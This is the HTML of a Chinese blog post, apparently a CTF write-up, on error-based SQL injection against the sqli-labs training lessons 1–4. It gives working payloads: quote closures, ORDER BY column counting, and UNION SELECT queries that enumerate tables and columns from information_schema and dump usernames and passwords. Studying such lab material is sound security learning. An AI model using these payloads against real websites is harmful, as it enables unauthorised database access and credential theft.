@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 5.4.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/capsules-solid.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/capsules-solid.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"cheriiceberg.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.10.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+  <meta name="description" content="0x00  GET报错注入0000    找出合适的闭合SQL语句">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入二">
+<meta property="og:url" content="https://cheriiceberg.github.io/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/index.html">
+<meta property="og:site_name" content="P27の博客">
+<meta property="og:description" content="0x00  GET报错注入0000    找出合适的闭合SQL语句">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cheriiceberg.github.io/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/less1error.jpg">
+<meta property="og:image" content="https://cheriiceberg.github.io/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/less2error.jpg">
+<meta property="og:image" content="https://cheriiceberg.github.io/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/less3error.jpg">
+<meta property="og:image" content="https://cheriiceberg.github.io/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/less4error.jpg">
+<meta property="og:image" content="https://cheriiceberg.github.io/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/lessorder.jpg">
+<meta property="og:image" content="https://cheriiceberg.github.io/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/lessorder4.jpg">
+<meta property="og:image" content="https://cheriiceberg.github.io/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/sqlstruct.png">
+<meta property="og:image" content="https://cheriiceberg.github.io/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/union123.jpg">
+<meta property="og:image" content="https://cheriiceberg.github.io/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/selecttable.jpg">
+<meta property="og:image" content="https://cheriiceberg.github.io/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/selectcolumn.jpg">
+<meta property="og:image" content="https://cheriiceberg.github.io/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/selectend.jpg">
+<meta property="article:published_time" content="2022-02-25T14:45:33.000Z">
+<meta property="article:modified_time" content="2022-02-27T10:12:35.283Z">
+<meta property="article:author" content="P 27">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="WEB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cheriiceberg.github.io/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/less1error.jpg">
+
+
+<link rel="canonical" href="https://cheriiceberg.github.io/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://cheriiceberg.github.io/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/","path":"2022/02/25/SQL注入二/","title":"SQL注入二"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SQL注入二 | P27の博客</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">P27の博客</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-guestbook"><a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言板</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-GET%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">0x00  GET报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0000-%E6%89%BE%E5%87%BA%E5%90%88%E9%80%82%E7%9A%84%E9%97%AD%E5%90%88SQL%E8%AF%AD%E5%8F%A5"><span class="nav-text">0000    找出合适的闭合SQL语句</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E7%A1%AE%E5%AE%9A%E4%BC%A0%E5%85%A5%E5%8F%82%E6%95%B0%E7%9A%84SQL%E8%AF%AD%E5%8F%A5%E5%8C%85%E8%A3%B9%E7%AC%A6%E5%8F%B7"><span class="nav-text">1、确定传入参数的SQL语句包裹符号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E5%BE%97%E5%87%BA%E9%97%AD%E5%90%88%E8%AF%AD%E5%8F%A5"><span class="nav-text">2、得出闭合语句</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0001-%E4%BD%BF%E7%94%A8order-by-%E8%AF%AD%E5%8F%A5%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="nav-text">0001    使用order by 语句判断字段数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%9A"><span class="nav-text">1、判断字段数的原因：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="nav-text">2、使用方法：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0002-%E4%BD%BF%E7%94%A8union-select%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%EF%BC%8C%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="nav-text">0002    使用union select联合查询，获取表名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01"><span class="nav-text">0x01</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="P 27"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">P 27</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/CheriIceberg" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;CheriIceberg" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cheriiceberg.github.io/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="P 27">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P27の博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入二
+        </h1>
+
+        <div class="post-meta-container">
+          
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-02-25 22:45:33" itemprop="dateCreated datePublished" datetime="2022-02-25T22:45:33+08:00">2022-02-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-02-27 18:12:35" itemprop="dateModified" datetime="2022-02-27T18:12:35+08:00">2022-02-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/" class="post-meta-item twikoo_visitors" data-flag-title="SQL注入二" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="twikoo_visitors"></span>
+    </span>
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="0x00-GET报错注入"><a href="#0x00-GET报错注入" class="headerlink" title="0x00  GET报错注入"></a>0x00  GET报错注入</h2><h3 id="0000-找出合适的闭合SQL语句"><a href="#0000-找出合适的闭合SQL语句" class="headerlink" title="0000    找出合适的闭合SQL语句"></a>0000    找出合适的闭合SQL语句</h3><span id="more"></span>
+
+<h4 id="1、确定传入参数的SQL语句包裹符号"><a href="#1、确定传入参数的SQL语句包裹符号" class="headerlink" title="1、确定传入参数的SQL语句包裹符号"></a>1、确定传入参数的SQL语句包裹符号</h4><p>找出闭合的方法，以sqli_labs中的less1-less4为例子</p>
+<p>less1中的报错提示语句为</p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/less1error.jpg"></p>
+<p>less2中的报错语句为</p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/less2error.jpg"></p>
+<p>less3中的报错语句为</p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/less3error.jpg"></p>
+<p>less4中的报错语句为</p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/less4error.jpg"></p>
+<p>​    最左边与最右边的两个单引号是报错语句引用SQL语句的部分不属于SQL语句里的一部分，单引号里面的内容分别是</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">less1:	<span class="string">&#x27;1&#x27;&#x27; LIMIT 0,1</span></span><br><span class="line"><span class="string">less2:	&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">less3:	<span class="string">&#x27;1&#x27;&#x27;) LIMIT 0,1</span></span><br><span class="line"><span class="string">less4:	&quot;1\&quot; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
+
+<p>去掉输入的内容,得出大概的SQL语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">less1:	<span class="keyword">select</span> ...... <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">less2:	<span class="keyword">select</span> ...... <span class="keyword">where</span> id <span class="operator">=</span>  id  LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">less3:	<span class="keyword">select</span> ...... <span class="keyword">where</span> id <span class="operator">=</span> (<span class="string">&#x27;id&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">less4:	<span class="keyword">select</span> ...... <span class="keyword">where</span> id <span class="operator">=</span> &quot;id&quot; LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2、得出闭合语句"><a href="#2、得出闭合语句" class="headerlink" title="2、得出闭合语句"></a>2、得出闭合语句</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">less1: id <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27; --+(注释)</span></span><br><span class="line"><span class="string">less2: id = 1  --+</span></span><br><span class="line"><span class="string">less3: id = 1&#x27;</span>) <span class="comment">--+</span></span><br><span class="line">less4: id <span class="operator">=</span> <span class="number">1</span>&quot; --+</span><br></pre></td></tr></table></figure>
+
+<p>输入闭合后的参数查询能正确进行</p>
+<h3 id="0001-使用order-by-语句判断字段数"><a href="#0001-使用order-by-语句判断字段数" class="headerlink" title="0001    使用order by 语句判断字段数"></a>0001    使用order by 语句判断字段数</h3><h4 id="1、判断字段数的原因："><a href="#1、判断字段数的原因：" class="headerlink" title="1、判断字段数的原因："></a>1、<strong>判断字段数的原因：</strong></h4><p><strong>在之后的<code>union select</code>的联合查询中需要利用正确的字段数进行</strong></p>
+<h4 id="2、使用方法："><a href="#2、使用方法：" class="headerlink" title="2、使用方法："></a>2、使用方法：</h4><p>在确定的闭合语句的参数后面加上<code>order by 字段数</code>，字段数的选择可以从1开始往后一个一个试，也可以使用二分法进行爆破</p>
+<p>在less1-less4中，知道设置字段数为3都能成功查询，设置为4则不能成功查询，由此可知字段数为3</p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/lessorder.jpg"></p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/lessorder4.jpg"></p>
+<h3 id="0002-使用union-select联合查询，获取表名"><a href="#0002-使用union-select联合查询，获取表名" class="headerlink" title="0002    使用union select联合查询，获取表名"></a>0002    使用union select联合查询，获取表名</h3><p>在使用查询之前要了解应该从哪里获取表名字段名等信息，这就得先了解数据库的结构，大致的结构可以看以下图片了解</p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/sqlstruct.png"></p>
+<p>由此可得我们要查询<code>tables</code>表内的表名，使用<code>union select</code>之前要使原来的查询报错才会执行联合查询的语句 </p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">0</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/union123.jpg"></p>
+<p>从图中可以看出<code>union</code>查询的位置在数值2跟3 的位置，可在两个位置中选一个进行注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()  --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/selecttable.jpg"></p>
+<p>通过查询可知在该数据库下有四个表分别为<code>emails</code>、<code>referers</code>、<code>uagents</code>、<code>users</code>，现在查询<code>users</code>表中的字段名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;  --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/selectcolumn.jpg"></p>
+<p>查询到<code>users</code>表中的字段有三个，下一步查询<code>username</code>与<code>password</code>中的信息，在这之前的查询都是在汇总的 数据库<code>information_schema</code>中查询的，现在目标明确是要<code>users</code>表中的<code>usrename</code>与<code>password</code>字段里的数据，可以直接进行查询而不用到<code>information_schema</code>中查询（该数据库也不会存储字段的数据内容）</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,group_concat(username,&#x27;</span>:<span class="string">&#x27;,password),3 from users  --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/selectend.jpg"></p>
+<p>less1-less4的注入就此结束，数据库中的所有信息都能获取到！</p>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="followme">
+  <span>文章结束辣！还有问题可以联系我一起讨论哦！推荐使用留言板哦!TuT</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="https://github.com/CheriIceberg">
+          <span class="icon">
+            <i class="fab fa-github"></i>
+          </span>
+
+          <span class="label">Github</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/WEB/" rel="tag"><i class="fa fa-tag"></i> WEB</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/" rel="prev" title="SQL注入一">
+                  <i class="fa fa-chevron-left"></i> SQL注入一
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/02/27/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" rel="next" title="python打包的exe解包为.py">
+                  python打包的exe解包为.py <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments"><div id="twikoo-comments"></div></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fas fa-capsules"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">P 27</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+<script class="next-config" data-name="twikoo" type="application/json">{"enable":true,"visitor":true,"envId":"https://twikoo-p91w.vercel.app","el":"#twikoo-comments"}</script>
+<script>
+document.addEventListener('page:loaded', () => {
+  NexT.utils.loadComments(CONFIG.twikoo.el)
+    .then(() => NexT.utils.getScript(
+      'https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js',
+      { condition: window.twikoo }
+    ))
+    .then(() => {
+      twikoo.init(CONFIG.twikoo);
+    });
+});
+</script>
+
+</body>
+</html>
